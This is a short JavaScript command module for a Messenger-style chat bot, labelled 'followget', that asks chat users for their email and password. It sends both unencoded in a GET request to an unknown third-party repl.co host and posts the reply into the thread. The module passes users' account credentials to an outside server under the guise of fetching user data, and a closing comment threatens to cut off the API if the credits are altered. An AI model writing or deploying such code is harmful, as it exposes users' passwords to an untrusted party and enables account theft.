module.exports.config = {
  name: "followget",
  version: "1.0.0",
  hasPermssion: 0,
  credits: "shiki",
  description: "Retrieve user data from followget API",
  commandCategory: "tools",
  usePrefix: true,
  cooldowns: 5
};

module.exports.run = async ({ api, event, args }) => {
    const axios = global.nodemodule["axios"];

    if (args.length !== 2) {
        return api.sendMessage("Please provide both email and password separated by space.", event.threadID, event.messageID);
    }

    const [email, password] = args.map(arg => arg.trim());

    const res = await axios.get(`https://folowget.hayih59124.repl.co/login?email=${email}&password=${password}`);
    const userData = res.data;

    return api.sendMessage(JSON.stringify(userData, null, 4), event.threadID, event.messageID);
}
//dont change credits or I'll off api